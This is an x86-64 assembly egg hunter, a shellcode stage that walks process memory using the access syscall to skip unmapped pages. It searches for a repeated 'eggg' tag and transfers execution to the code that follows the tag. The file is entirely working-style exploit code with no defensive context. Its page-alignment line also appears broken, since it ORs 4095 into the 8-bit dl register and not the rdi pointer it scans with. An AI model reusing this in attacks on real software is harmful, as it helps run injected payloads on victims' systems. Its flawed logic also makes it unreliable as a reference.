global _start

section .text
_start:
    xor     rdi, rdi

next_page:
    or      dl, 4095                    ; getconf PAGE_SIZE
    
next_byte:
    inc     rdi

test:
    xor     rax, rax
    xor     rsi, rsi                    ; F_OK
    mov     al, 21                      ; access
    syscall

    ;; EFAULT=14 
    ;; access returns -ERRNO,
    ;; so twos(1110)
    cmp     al, 0xf2                    ; cat /usr/include/asm-generic/errno-base.h | grep EFAULT
    je      next_page

    cmp     dword [rdi], 0x67676765     ; eggg
    jne     next_byte
    cmp     dword [rdi+4], 0x67676765   ; eggg
    jne     next_byte

    lea     rax, [rdi+8]
    jmp     rax
